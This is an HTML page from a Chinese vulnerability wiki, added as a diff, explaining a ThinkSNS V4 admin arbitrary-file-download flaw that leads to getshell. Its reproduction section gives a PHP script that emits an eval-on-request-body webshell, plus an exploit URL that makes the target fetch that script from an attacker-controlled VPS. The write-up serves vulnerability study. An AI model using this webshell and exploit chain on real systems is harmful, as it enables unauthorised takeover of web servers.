@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/ThinkSNS/ThinkSNS%20V4%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%AF%BC%E8%87%B4getshell/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>ThinkSNS V4 后台任意文件下载导致getshell - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "ThinkSNS V4 \u540e\u53f0\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u5bfc\u81f4getshell", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Thinkphp/Thinkphp%E4%B8%93%E7%94%A8shell/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Thinkphp/Thinkphp%E4%B8%93%E7%94%A8shell/" class="btn btn-xs btn-link">
+        Thinkphp 专用shell
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../ThinkCMF/%EF%BC%88CVE-2019-7580%EF%BC%89ThinkCMF%205.0.190111%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../ThinkCMF/%EF%BC%88CVE-2019-7580%EF%BC%89ThinkCMF%205.0.190111%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        （CVE-2019-7580）ThinkCMF 5.0.190111 后台代码执行漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="thinksns-v4-getshell">ThinkSNS V4 后台任意文件下载导致getshell<a class="headerlink" href="#thinksns-v4-getshell" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_4">漏洞分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>存在漏洞代码<code>\ts4\apps\admin\Lib\Action\UpgradeAction.class.php</code>中的一个函数中。</p>
+<div class="codehilite"><pre><span></span><code><span class="n">public</span><span class="w"> </span><span class="kr">function</span><span class="w"> </span><span class="n">step1</span><span class="p">()</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="err">$</span><span class="n">downUrl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="s">&#39;upurl&#39;</span><span class="p">];</span>
+<span class="w">    </span><span class="err">$</span><span class="n">downUrl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">urldecode</span><span class="p">(</span><span class="err">$</span><span class="n">downUrl</span><span class="p">);</span>
+<span class="w">    </span><span class="err">$</span><span class="n">path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DATA_PATH</span><span class="p">.</span><span class="s">&#39;/&#39;</span><span class="p">.</span><span class="s">&#39;upgrade/&#39;</span><span class="p">.</span><span class="n">basename</span><span class="p">(</span><span class="err">$</span><span class="n">downUrl</span><span class="p">);</span>
+
+<span class="w">    </span><span class="c1">// # 备份老配置文件</span>
+<span class="w">    </span><span class="err">$</span><span class="n">oldConf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">file_get_contents</span><span class="p">(</span><span class="n">CONF_PATH</span><span class="p">.</span><span class="s">&#39;/thinksns.conf.php&#39;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">file_put_contents</span><span class="p">(</span><span class="n">DATA_PATH</span><span class="p">.</span><span class="s">&#39;/old.thinksns.conf.php&#39;</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">oldConf</span><span class="p">);</span>
+
+<span class="w">    </span><span class="c1">// # 下载增量包</span>
+<span class="w">    </span><span class="n">is_dir</span><span class="p">(</span><span class="n">dirname</span><span class="p">(</span><span class="err">$</span><span class="n">path</span><span class="p">))</span><span class="w"> </span><span class="kr">or</span><span class="w"> </span><span class="n">mkdir</span><span class="p">(</span><span class="n">dirname</span><span class="p">(</span><span class="err">$</span><span class="n">path</span><span class="p">),</span><span class="w"> </span><span class="mo">0777</span><span class="p">,</span><span class="w"> </span><span class="kr">true</span><span class="p">);</span>
+<span class="w">    </span><span class="n">file_put_contents</span><span class="p">(</span><span class="err">$</span><span class="n">path</span><span class="p">,</span><span class="w"> </span><span class="n">file_get_contents</span><span class="p">(</span><span class="err">$</span><span class="n">downUrl</span><span class="p">));</span>
+<span class="w">    </span><span class="n">file_exists</span><span class="p">(</span><span class="err">$</span><span class="n">path</span><span class="p">)</span><span class="w"> </span><span class="kr">or</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">showError</span><span class="p">(</span><span class="s">&#39;下载升级包失败，请检查&#39;</span><span class="p">.</span><span class="n">dirname</span><span class="p">(</span><span class="err">$</span><span class="n">path</span><span class="p">).</span><span class="s">&#39;目录是否可写，如果可写，请刷新重试！&#39;</span><span class="p">);</span>
+
+<span class="w">    </span><span class="c1">// 验证hash判断包是否合法。</span>
+<span class="w">    </span><span class="err">$</span><span class="n">filename</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">dirname</span><span class="p">(</span><span class="err">$</span><span class="n">path</span><span class="p">).</span><span class="s">&#39;/upgrade.json&#39;</span><span class="p">;</span>
+<span class="w">    </span><span class="err">$</span><span class="kt">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">file_get_contents</span><span class="p">(</span><span class="err">$</span><span class="n">filename</span><span class="p">);</span>
+<span class="w">    </span><span class="err">$</span><span class="kt">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">json_decode</span><span class="p">(</span><span class="err">$</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="kr">false</span><span class="p">);</span>
+<span class="w">    </span><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="n">md5_file</span><span class="p">(</span><span class="err">$</span><span class="n">path</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="err">$</span><span class="n">data</span><span class="o">-&gt;</span><span class="n">md5</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">showError</span><span class="p">(</span><span class="s">&#39;更新包校验失败，请重新执行升级.&#39;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+</code></pre></div>
+
+<p>函数</p>
+<div class="codehilite"><pre><span></span><code>file_put_contents — 将一个字符串写入文件
+file_get_contents — 将整个文件读入一个字符串
+</code></pre></div>
+
+<p>在这段函数中，先备份老配置文件，然后下载增量包，下载参数$downUrl未经过任何处理，直接下载到网站目录下，接着验证hash判断包是否合法，但是并没有删除下载的增量包，导致程序在实现上存在任意文件下载漏洞，下载远程文件到网站目录下，攻击者可指定第三方url下载恶意脚本到网站目录，进一步触发恶意代码，控制网站服务器。</p>
+<h3 id="_5">漏洞复线<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p>在自己的服务器创建一个 <code>ian.php</code></p>
+<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>   
+<span class="k">echo</span> <span class="s2">&quot;&lt;?php&quot;</span><span class="p">;</span>
+<span class="k">echo</span> <span class="s2">&quot;eval(file_get_contents(&#39;php://input&#39;));&quot;</span><span class="p">;</span>  
+<span class="k">echo</span> <span class="s2">&quot;?&gt;&quot;</span><span class="p">;</span>  
+<span class="cp">?&gt;</span>
+</code></pre></div>
+
+<p>登录后台，通过访问构造的url，成功下载第三方源的恶意脚本文件</p>
+<p><code>http://www.0-sec.org:8000/ts4/index.php?app=admin&amp;mod=Upgrade&amp;act=step1&amp;upurl=http://你的vps:8000/ian.php</code></p>
+<p>通过直接访问url，触发代码执行，成功获取网站服务器权限。</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Thinkphp/Thinkphp%E4%B8%93%E7%94%A8shell/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Thinkphp/Thinkphp%E4%B8%93%E7%94%A8shell/" class="btn btn-xs btn-link">
+        Thinkphp 专用shell
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../ThinkCMF/%EF%BC%88CVE-2019-7580%EF%BC%89ThinkCMF%205.0.190111%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../ThinkCMF/%EF%BC%88CVE-2019-7580%EF%BC%89ThinkCMF%205.0.190111%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        （CVE-2019-7580）ThinkCMF 5.0.190111 后台代码执行漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
